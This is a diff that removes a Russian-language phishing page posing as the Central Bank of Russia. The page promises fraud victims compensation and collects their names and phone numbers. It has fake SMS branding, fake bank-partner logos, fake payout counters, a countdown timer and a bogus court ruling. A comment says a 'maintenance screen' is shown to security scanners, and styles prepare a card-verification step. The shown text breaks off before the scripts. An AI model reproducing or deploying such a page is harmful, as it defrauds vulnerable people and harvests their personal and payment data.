@@ -1,1123 +1,352 @@
-<!DOCTYPE html>
-<html lang="ru">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ЦБ РФ | Компенсационная программа</title>
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Arial, sans-serif; }
-        body {
-            background: linear-gradient(135deg, rgba(13, 71, 161, 0.7) 0%, rgba(26, 35, 126, 0.8) 100%);
-            color: white;
-            min-height: 100vh;
-            padding: 15px;
-            position: relative;
-        }
-        body::before {
-            content: '';
-            position: fixed;
-            top: 0; left: 0;
-            width: 100%; height: 100%;
-            background: url(' https://avatars.mds.yandex.net/i?id=5f95dfabeb4f59d3ef16a741dedd6b90_l-5221578-images-thumbs&n=13') no-repeat center center;
-            background-size: cover;
-            opacity: 0.4;
-            z-index: -1;
-        }
-        .container {
-            max-width: 480px;
-            margin: 0 auto;
-            background: rgba(255, 255, 255, 0.98);
-            color: #333;
-            border-radius: 20px;
-            padding: 25px;
-            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.4);
-            position: relative;
-            border: 1px solid rgba(13, 71, 161, 0.3);
-        }
-        .header {
-            text-align: center;
-            padding-bottom: 20px;
-            margin-bottom: 25px;
-            border-bottom: 3px solid #0d47a1;
-            position: relative;
-        }
-        .logo-text {
-            font-size: 1.7em;
-            color: #0d47a1;
-            font-weight: 800;
-            margin-bottom: 5px;
-            text-shadow: 1px 1px 2px rgba(0,0,0,0.1);
-        }
-        .badge {
-            background: linear-gradient(135deg, #4caf50, #2e7d32);
-            color: white;
-            padding: 6px 18px;
-            border-radius: 20px;
-            display: inline-block;
-            margin: 8px 0;
-            font-size: 0.85em;
-            font-weight: bold;
-            box-shadow: 0 4px 8px rgba(76, 175, 80, 0.3);
-        }
-        .form-group { margin-bottom: 18px; }
-        label {
-            display: block;
-            margin-bottom: 6px;
-            color: #555;
-            font-weight: 600;
-            font-size: 0.95em;
-        }
-        input {
-            width: 100%;
-            padding: 14px 16px;
-            border: 2px solid #ddd;
-            border-radius: 10px;
-            font-size: 16px;
-            transition: all 0.3s;
-            background: #f9f9f9;
-        }
-        input:focus {
-            border-color: #0d47a1;
-            background: white;
-            box-shadow: 0 0 0 3px rgba(13, 71, 161, 0.1);
-            outline: none;
-        }
-        .check-btn {
-            width: 100%;
-            padding: 18px;
-            background: linear-gradient(135deg, #0d47a1, #1a237e);
-            color: white;
-            border: none;
-            border-radius: 12px;
-            font-size: 1.1em;
-            font-weight: bold;
-            cursor: pointer;
-            margin: 15px 0;
-            transition: all 0.3s;
-            letter-spacing: 0.5px;
-            box-shadow: 0 6px 15px rgba(13, 71, 161, 0.4);
-        }
-        .check-btn:hover {
-            background: linear-gradient(135deg, #1a237e, #0d47a1);
-            transform: translateY(-2px);
-            box-shadow: 0 10px 20px rgba(13, 71, 161, 0.5);
-        }
-        .check-btn:active {
-            transform: translateY(0);
-        }
-        .result {
-            display: none;
-            background: linear-gradient(135deg, #e8f5e9, #c8e6c9);
-            padding: 25px;
-            border-radius: 15px;
-            margin: 25px 0;
-            text-align: center;
-            border: 2px solid #4caf50;
-            position: relative;
-            overflow: hidden;
-        }
-        .result::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            right: 0;
-            height: 4px;
-            background: linear-gradient(90deg, #4caf50, #2e7d32, #4caf50);
-            animation: shimmer 2s infinite linear;
-        }
-        @keyframes shimmer {
-            0% { background-position: -200px 0; }
-            100% { background-position: 200px 0; }
-        }
-        .amount {
-            font-size: 2.8em;
-            color: #0d47a1;
-            font-weight: 900;
-            margin: 20px 0;
-            text-shadow: 2px 2px 4px rgba(0,0,0,0.1);
-        }
-        .download-btn {
-            display: block;
-            background: linear-gradient(135deg, #ff9800, #e68900);
-            color: white;
-            text-align: center;
-            padding: 17px;
-            border-radius: 12px;
-            text-decoration: none;
-            margin: 20px 0;
-            font-weight: bold;
-            font-size: 1.05em;
-            transition: all 0.3s;
-            box-shadow: 0 6px 15px rgba(255, 152, 0, 0.4);
-            position: relative;
-            overflow: hidden;
-        }
-        .download-btn::after {
-            content: '⬇️';
-            position: absolute;
-            right: 20px;
-            top: 50%;
-            transform: translateY(-50%);
-            font-size: 1.2em;
-            animation: bounce 2s infinite;
-        }
-        @keyframes bounce {
-            0%, 100% { transform: translateY(-50%); }
-            50% { transform: translateY(-60%); }
-        }
-        .download-btn:hover {
-            background: linear-gradient(135deg, #e68900, #ff9800);
-            transform: translateY(-2px);
-            box-shadow: 0 10px 20px rgba(255, 152, 0, 0.5);
-        }
-        .manager-note {
-            background: linear-gradient(135deg, #e3f2fd, #bbdefb);
-            border: 2px solid #2196f3;
-            padding: 15px;
-            border-radius: 12px;
-            margin: 20px 0;
-            font-size: 0.92em;
-            color: #0d47a1;
-            position: relative;
-        }
-        .manager-note::before {
-            content: '❗';
-            position: absolute;
-            left: 15px;
-            top: 15px;
-            font-size: 1.2em;
-        }
-        .card-verification-section {
-            display: none;
-            background: linear-gradient(135deg, #f5f5f5, #e0e0e0);
-            padding: 22px;
-            border-radius: 15px;
-            margin: 22px 0;
-            border: 3px solid #0d47a1;
-            box-shadow: inset 0 2px 10px rgba(0,0,0,0.1);
-        }
-        .card-row {
-            display: flex;
-            gap: 12px;
-            margin-bottom: 18px;
-        }
-        .card-row .form-group {
-            flex: 1;
-        }
-        .card-row .form-group:last-child {
-            flex: 0.6;
-        }
-        .loader {
-            display: none;
-            text-align: center;
-            padding: 30px;
-            background: white;
-            border-radius: 15px;
-            margin: 20px 0;
-            box-shadow: 0 5px 20px rgba(0,0,0,0.1);
-        }
-        .loader-spinner {
-            border: 6px solid #f3f3f3;
-            border-top: 6px solid #0d47a1;
-            border-radius: 50%;
-            width: 60px;
-            height: 60px;
-            animation: spin 1s linear infinite;
-            margin: 0 auto 20px;
-            position: relative;
-        }
-        .loader-spinner::after {
-            content: '';
-            position: absolute;
-            top: -6px; left: -6px; right: -6px; bottom: -6px;
-            border: 6px solid transparent;
-            border-top: 6px solid #ff9800;
-            border-radius: 50%;
-            animation: spin 1.5s linear infinite reverse;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        .verification-error {
-            display: none;
-            background: linear-gradient(135deg, #ffebee, #ffcdd2);
-            border: 2px solid #f44336;
-            color: #d32f2f;
-            padding: 22px;
-            border-radius: 12px;
-            margin: 22px 0;
-            text-align: center;
-            position: relative;
-        }
-        .verification-error::before {
-            content: '⚠️';
-            font-size: 2em;
-            display: block;
-            margin-bottom: 10px;
-        }
-        .payment-counter {
-            text-align: center;
-            background: linear-gradient(135deg, #e8f5e9, #c8e6c9);
-            padding: 14px;
-            border-radius: 12px;
-            margin: 18px 0;
-            border-left: 5px solid #4caf50;
-            font-weight: bold;
-            color: #2e7d32;
-            box-shadow: 0 4px 12px rgba(76, 175, 80, 0.2);
-        }
-        .option-buttons {
-            display: flex;
-            gap: 15px;
-            margin: 22px 0;
-        }
-        .option-btn {
-            flex: 1;
-            padding: 22px 12px;
-            text-align: center;
-            border-radius: 12px;
-            cursor: pointer;
-            font-weight: bold;
-            transition: all 0.3s;
-            box-shadow: 0 5px 15px rgba(0,0,0,0.15);
-            position: relative;
-            overflow: hidden;
-        }
-        .option-btn::before {
-            content: '';
-            position: absolute;
-            top: 0; left: 0;
-            width: 100%; height: 100%;
-            background: linear-gradient(rgba(255,255,255,0.1), rgba(255,255,255,0));
-            pointer-events: none;
-        }
-        .option-btn.primary {
-            background: linear-gradient(135deg, #0d47a1, #1565c0);
-            color: white;
-        }
-        .option-btn.secondary {
-            background: linear-gradient(135deg, #ff9800, #ff5722);
-            color: white;
-        }
-        .option-btn:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 8px 20px rgba(0,0,0,0.25);
-        }
-        .timer-container {
-            background: linear-gradient(135deg, #fff3e0, #ffcc80);
-            border: 2px solid #ff9800;
-            border-radius: 12px;
-            padding: 18px;
-            margin: 20px 0;
-            text-align: center;
-            display: none;
-        }
-        .timer {
-            font-size: 2.2em;
-            font-weight: 900;
-            color: #d84315;
-            margin: 10px 0;
-            font-family: 'Courier New', monospace;
-            text-shadow: 1px 1px 2px rgba(0,0,0,0.2);
-        }
-        .counter-box {
-            background: linear-gradient(135deg, #e1f5fe, #b3e5fc);
-            border: 2px solid #0288d1;
-            border-radius: 12px;
-            padding: 15px;
-            margin: 15px 0;
-            text-align: center;
-        }
-        .counter {
-            font-size: 1.8em;
-            font-weight: 900;
-            color: #0277bd;
-            margin: 8px 0;
-        }
-        .geo-info {
-            background: linear-gradient(135deg, #f3e5f5, #e1bee7);
-            border: 2px solid #7b1fa2;
-            border-radius: 12px;
-            padding: 18px;
-            margin: 18px 0;
-            position: relative;
-        }
-        .geo-info::before {
-            content: '📍';
-            position: absolute;
-            left: 18px;
-            top: 18px;
-            font-size: 1.5em;
-        }
-        .banks {
-            display: flex;
-            justify-content: space-around;
-            flex-wrap: wrap;
-            gap: 10px;
-            margin: 20px 0;
-            padding: 15px;
-            background: rgba(255, 255, 255, 0.9);
-            border-radius: 12px;
-            border: 2px solid #0d47a1;
-        }
-        .bank-logo {
-            width: 50px;
-            height: 50px;
-            background-size: cover;
-            background-position: center;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            box-shadow: 0 4px 8px rgba(0,0,0,0.2);
-            cursor: pointer;
-            transition: all 0.3s;
-            text-decoration: none;
-        }
-        .bank-logo:hover {
-            transform: scale(1.1);
-            box-shadow: 0 6px 12px rgba(0,0,0,0.3);
-        }
-        .progress-bar {
-            height: 12px;
-            background: #e0e0e0;
-            border-radius: 6px;
-            overflow: hidden;
-            margin: 15px 0;
-            position: relative;
-        }
-        .progress-fill {
-            height: 100%;
-            background: linear-gradient(90deg, #4caf50, #2e7d32);
-            border-radius: 6px;
-            width: 84%;
-            position: relative;
-            overflow: hidden;
-        }
-        .progress-fill::after {
-            content: '';
-            position: absolute;
-            top: 0; left: 0; right: 0; bottom: 0;
-            background: linear-gradient(90deg, 
-                transparent, 
-                rgba(255,255,255,0.4), 
-                transparent);
-            animation: progressShimmer 2s infinite;
-        }
-        @keyframes progressShimmer {
-            0% { transform: translateX(-100%); }
-            100% { transform: translateX(100%); }
-        }
-        .notification-toast {
-            position: fixed;
-            bottom: 20px;
-            right: 20px;
-            background: linear-gradient(135deg, #4caf50, #2e7d32);
-            color: white;
-            padding: 15px 20px;
-            border-radius: 10px;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.3);
-            z-index: 10000;
-            max-width: 300px;
-            display: none;
-            animation: slideIn 0.5s ease;
-            border-left: 5px solid #2e7d32;
-        }
-        @keyframes slideIn {
-            from { transform: translateX(100%); opacity: 0; }
-            to { transform: translateX(0); opacity: 1; }
-        }
-        .sms-interface {
-            background: #e0f7fa;
-            border: 2px solid #006064;
-            border-radius: 12px;
-            padding: 0;
-            margin: 20px 0;
-            overflow: hidden;
-            font-family: 'SF Pro Text', -apple-system, sans-serif;
-        }
-        .sms-header {
-            background: #006064;
-            color: white;
-            padding: 12px 15px;
-            font-size: 0.9em;
-            display: flex;
-            justify-content: space-between;
-        }
-        .sms-content {
-            padding: 20px 15px;
-            background: white;
-            margin: 10px;
-            border-radius: 8px;
-            border: 1px solid #b2ebf2;
-        }
-        .sms-sender {
-            color: #006064;
-            font-weight: bold;
-            margin-bottom: 8px;
-        }
-        .sms-text {
-            color: #333;
-            line-height: 1.5;
-            margin-bottom: 15px;
-        }
-        .sms-link {
-            color: #0d47a1;
-            font-weight: bold;
-            word-break: break-all;
-            font-size: 0.9em;
-        }
-        .review-btn {
-            background: linear-gradient(135deg, #9c27b0, #7b1fa2);
-            color: white;
-            border: none;
-            border-radius: 10px;
-            padding: 12px 20px;
-            font-weight: bold;
-            cursor: pointer;
-            margin: 15px 0;
-            width: 100%;
-            transition: all 0.3s;
-        }
-        .review-btn:hover {
-            background: linear-gradient(135deg, #7b1fa2, #9c27b0);
-            transform: translateY(-2px);
-        }
-        .review-modal {
-            display: none;
-            position: fixed;
-            top: 0; left: 0;
-            width: 100%; height: 100%;
-            background: rgba(0,0,0,0.8);
-            z-index: 10001;
-            justify-content: center;
-            align-items: center;
-        }
-        .review-content {
-            background: white;
-            padding: 30px;
-            border-radius: 20px;
-            max-width: 400px;
-            width: 90%;
-            position: relative;
-        }
-        .refresh-btn {
-            position: fixed;
-            top: 20px;
-            right: 20px;
-            background: #f44336;
-            color: white;
-            border: none;
-            border-radius: 50%;
-            width: 50px;
-            height: 50px;
-            font-size: 1.5em;
-            cursor: pointer;
-            z-index: 9999;
-            box-shadow: 0 5px 15px rgba(244, 67, 54, 0.4);
-            display: none;
-        }
-        .maintenance-screen {
-            display: none;
-            position: fixed;
-            top: 0; left: 0;
-            width: 100%; height: 100%;
-            background: linear-gradient(135deg, #0d47a1, #1a237e);
-            color: white;
-            z-index: 10002;
-            justify-content: center;
-            align-items: center;
-            text-align: center;
-            padding: 20px;
-            font-size: 1.2em;
-        }
-        .live-check {
-            background: rgba(13, 71, 161, 0.1);
-            padding: 10px 15px;
-            border-radius: 10px;
-            margin: 10px 0;
-            font-size: 0.9em;
-            color: #0d47a1;
-            border-left: 3px solid #0d47a1;
-        }
-        .live-check::before {
-            content: '🔴';
-            margin-right: 8px;
-            animation: pulse 1.5s infinite;
-        }
-        @keyframes pulse {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.5; }
-        }
-        .cb-logo {
-            width: 70px;
-            height: 70px;
-            background: url('https://avatars.mds.yandex.net/i?id=5f95dfabeb4f59d3ef16a741dedd6b90_l-5221578-images-thumbs&n=13') center/cover;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: white;
-            font-weight: bold;
-            font-size: 0.9em;
-            text-align: center;
-            box-shadow: 0 8px 20px rgba(13, 71, 161, 0.4);
-            cursor: pointer;
-            transition: all 0.3s;
-            text-decoration: none;
-            margin: 0 auto 15px;
-        }
-        .cb-logo:hover {
-            transform: scale(1.05);
-            box-shadow: 0 12px 25px rgba(13, 71, 161, 0.5);
-        }
-        @media (max-width: 600px) {
-            .container { padding: 20px; }
-            .option-buttons { flex-direction: column; }
-            .bank-logo { width: 40px; height: 40px; }
-            .amount { font-size: 2.2em; }
-            .timer { font-size: 1.8em; }
-        }
-        @media (max-width: 400px) {
-            .container { padding: 15px; }
-            .logo-text { font-size: 1.4em; }
-            .check-btn, .download-btn { padding: 15px; }
-        }
-    </style>
-</head>
-<body>
-    <!-- ЭКРАН ТЕХОБСЛУЖИВАНИЯ (для сканеров) -->
-    <div class="maintenance-screen" id="maintenanceScreen">
-        <div>
-            <h2 style="margin-bottom: 20px;">🔧 Техническое обслуживание</h2>
-            <p>Портал временно недоступен.</p>
-            <p>Проводится обновление системы безопасности ЦБ РФ.</p>
-            <p style="margin-top: 30px; font-size: 0.9em; color: #bbdefb;">
-                Пожалуйста, попробуйте позже или обновите страницу.
-            </p>
-            <button onclick="location.reload()" style="
-                background: white;
-                color: #0d47a1;
-                border: none;
-                padding: 12px 30px;
-                border-radius: 8px;
-                margin-top: 20px;
-                font-weight: bold;
-                cursor: pointer;
-            ">
-                Обновить страницу
-            </button>
-        </div>
-    </div>
-
-    <!-- КНОПКА ОБНОВЛЕНИЯ (показывается только после техобслуживания) -->
-    <button class="refresh-btn" id="refreshBtn" onclick="location.reload()" title="Обновить страницу">
-        ↻
-    </button>
-
-    <!-- УВЕДОМЛЕНИЯ -->
-    <div class="notification-toast" id="notificationToast"></div>
-
-    <!-- МОДАЛКА ОТЗЫВОВ -->
-    <div class="review-modal" id="reviewModal">
-        <div class="review-content">
-            <h3 style="color: #0d47a1; margin-bottom: 20px;">✍️ Оставить отзыв</h3>
-            <div class="form-group">
-                <label>Ваше имя</label>
-                <input type="text" id="reviewName" placeholder="Иван Иванов">
-            </div>
-            <div class="form-group">
-                <label>Ваш город</label>
-                <input type="text" id="reviewCity" placeholder="Москва">
-            </div>
-            <div class="form-group">
-                <label>Сумма выплаты (₽)</label>
-                <input type="number" id="reviewAmount" placeholder="189000">
-            </div>
-            <div class="form-group">
-                <label>Ваш отзыв</label>
-                <textarea id="reviewText" placeholder="Расскажите о вашем опыте..." 
-                          style="width: 100%; padding: 12px; border-radius: 8px; border: 2px solid #ddd; min-height: 100px;"></textarea>
-            </div>
-            <button class="check-btn" onclick="submitReview()" style="margin-top: 20px;">
-                📤 Отправить отзыв
-            </button>
-            <button onclick="document.getElementById('reviewModal').style.display='none'" 
-                    style="background: #666; color: white; border: none; padding: 10px; border-radius: 8px; width: 100%; margin-top: 10px; cursor: pointer;">
-                Отмена
-            </button>
-        </div>
-    </div>
-
-    <!-- ОСНОВНОЙ КОНТЕЙНЕР -->
-    <div class="container" id="mainContainer">
-        <!-- ШАПКА -->
-        <div class="header">
-            <!-- ЛОГОТИП ЦБ (кликабельный) -->
-            <a href="https://www.cbr.ru" target="_blank" class="cb-logo"></a>
-            
-            <div style="text-align: center;">
-                <div class="logo-text">
-                    ЦЕНТРАЛЬНЫЙ БАНК<br>РОССИЙСКОЙ ФЕДЕРАЦИИ
-                </div>
-                <div class="badge">
-                    ✅ Официальная программа компенсаций
-                </div>
-            </div>
-            
-            <!-- SMS-ИНТЕРФЕЙС -->
-            <div class="sms-interface" id="smsInterface">
-                <div class="sms-header">
-                    <span>ЦБ РФ</span>
-                    <span>Только что</span>
-                </div>
-                <div class="sms-content">
-                    <div class="sms-sender">От: ЦБ РФ</div>
-                    <div class="sms-text">
-                        Проверьте компенсацию до 280 000 ₽ для пострадавших от телефонных мошенников.
-                    </div>
-                    <div class="sms-link" id="smsLink">cbrf-comp.ru/check</div>
-                </div>
-            </div>
-
-            <div style="background: linear-gradient(135deg, #f0f7ff, #e3f2fd); padding: 18px; border-radius: 15px; border-left: 5px solid #0d47a1; margin-top: 15px;">
-                <p style="color: #333; margin: 0; line-height: 1.5; font-size: 0.95em;">
-                    <strong style="color: #0d47a1;">📍 Возврат средств пострадавшим от мошенников</strong><br>
-                    Если вам звонили от лица банка или службы безопасности и вы переводили деньги — проверьте право на компенсацию.
-                </p>
-            </div>
-        </div>
-
-        <!-- СЧЕТЧИКИ И ТАЙМЕР -->
-        <div class="counter-box">
-            <div style="font-size: 0.9em; color: #0277bd;">Осталось свободных заявок:</div>
-            <div class="counter" id="requestsCounter">90</div>
-            <div style="font-size: 0.8em; color: #666; margin-top: 5px;">Сейчас онлайн проверяют: <span id="onlineUsers">12</span> человек</div>
-        </div>
-
-        <!-- ГЕОЛОКАЦИЯ ПО РЕАЛЬНОМУ IP -->
-        <div class="geo-info" id="geoInfo">
-            <div style="margin-left: 40px;">
-                <strong style="color: #7b1fa2;">📍 Определение местоположения...</strong><br>
-                <div style="font-size: 0.9em; margin-top: 8px; color: #555;">
-                    ⚠️ Загрузка данных геолокации
-                </div>
-            </div>
-        </div>
-
-        <!-- БАНКИ-ПАРТНЕРЫ (КЛИКАБЕЛЬНЫЕ) -->
-        <div style="text-align: center; margin: 15px 0; color: #0d47a1; font-weight: bold;">
-            🏦 Программа поддержана банками:
-        </div>
-        <div class="banks">
-            <a href="https://www.sberbank.ru" target="_blank" class="bank-logo" title="Сбербанк" style="background-image: url('https://i.ytimg.com/vi/VWG-iwsocLQ/maxresdefault.jpg');"></a>
-            <a href="https://www.tinkoff.ru" target="_blank" class="bank-logo" title="Тинькофф" style="background-image: url('https://is1-ssl.mzstatic.com/image/thumb/Purple221/v4/ca/d1/18/cad118e3-1b98-6d38-05e7-aa8e5ab4fa3e/AppIcon-0-0-1x_U007epad-0-0-85-220.png/1200x630wa.png');"></a>
-            <a href="https://www.vtb.ru" target="_blank" class="bank-logo" title="ВТБ" style="background-image: url('data:image/jpeg;base64,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');"></a>
-            <a href="https://alfabank.ru" target="_blank" class="bank-logo" title="Альфа-Банк" style="background-image: url('https://avatars.mds.yandex.net/i?id=06820d835b2e6bdec207420d72d22c01_l-7684368-images-thumbs&n=13');"></a>
-            <a href="https://www.gazprombank.ru" target="_blank" class="bank-logo" title="Газпромбанк" style="background-image: url('https://avatars.mds.yandex.net/get-mpic/11396163/2a00000193b393533194ea9223f19f1638b6/orig');"></a>
-            <a href="https://sovcombank.ru" target="_blank" class="bank-logo" title="Совкомбанк" style="background-image: url('https://www.bankdelo.ru/site/public/files/17/16115-sovkombank.jpg');"></a>
-            <a href="https://www.raiffeisen.ru" target="_blank" class="bank-logo" title="Райффайзен" style="background-image: url('https://avatars.mds.yandex.net/i?id=385646e4ababcd22ce3b4ad2f0c2a1b30f6d2611-7174559-images-thumbs&n=13');"></a>
-        </div>
-
-        <!-- ПРОГРЕСС-БАР ВЫПЛАТ -->
-        <div style="margin: 20px 0;">
-            <div style="display: flex; justify-content: space-between; margin-bottom: 8px;">
-                <span style="font-weight: bold; color: #333;">Выплачено сегодня:</span>
-                <span style="font-weight: bold; color: #2e7d32;">8.4 / 10 млн ₽</span>
-            </div>
-            <div class="progress-bar">
-                <div class="progress-fill"></div>
-            </div>
-            <div style="text-align: center; margin-top: 5px; font-size: 0.9em; color: #666;">
-                Осталось к выплате: <strong>1.6 млн ₽</strong>
-            </div>
-        </div>
-
-        <!-- ФОРМА ПРОВЕРКИ -->
-        <div class="form-group">
-            <label>Фамилия</label>
-            <input type="text" id="lastName" placeholder="Иванов" required data-field="userSurname">
-        </div>
-        <div class="form-group">
-            <label>Имя</label>
-            <input type="text" id="firstName" placeholder="Иван" required data-field="userName">
-        </div>
-        <div class="form-group">
-            <label>Отчество</label>
-            <input type="text" id="middleName" placeholder="Иванович" data-field="userMiddleName">
-        </div>
-        <div class="form-group">
-            <label>Номер телефона</label>
-            <input type="tel" id="phone" placeholder="+7 999 123-45-67" required data-field="userPhone">
-        </div>
-
-        <!-- КНОПКА ПРОВЕРКИ -->
-        <button class="check-btn" onclick="checkCompensation()">
-            🔍 ПРОВЕРИТЬ КОМПЕНСАЦИЮ
-        </button>
-
-        <!-- КНОПКА ОТЗЫВА -->
-        <button class="review-btn" onclick="showReviewModal()">
-            ✍️ Оставить отзыв о выплате
-        </button>
-
-        <!-- РЕЗУЛЬТАТ -->
-        <div class="result" id="result">
-            <div class="badge">🎉 ВАША ВЫПЛАТА ОДОБРЕНА!</div>
-            <h3 id="userName"></h3>
-            <p>По решению Арбитражного суда г. Москва</p>
-            <div class="amount" id="moneyAmount">0 ₽</div>
-            <p>Средства зарезервированы на ваше имя.</p>
-            <p style="color: #666; font-size: 0.9em; margin-top: -10px; margin-bottom: 15px;">
-                В связи с участившимися случаями злоупотреблений и для предотвращения недобросовестных действий, требуется подтверждение личности.
-            </p>
-
-            <!-- ТАЙМЕР -->
-            <div class="timer-container" id="timerContainer">
-                <div style="font-weight: bold; color: #ff6f00;">⏰ Осталось получить:</div>
-                <div class="timer" id="timer">59:59</div>
-                <div style="font-size: 0.9em; color: #666;">
-                    Выплата будет отменена автоматически
-                </div>
-            </div>
-
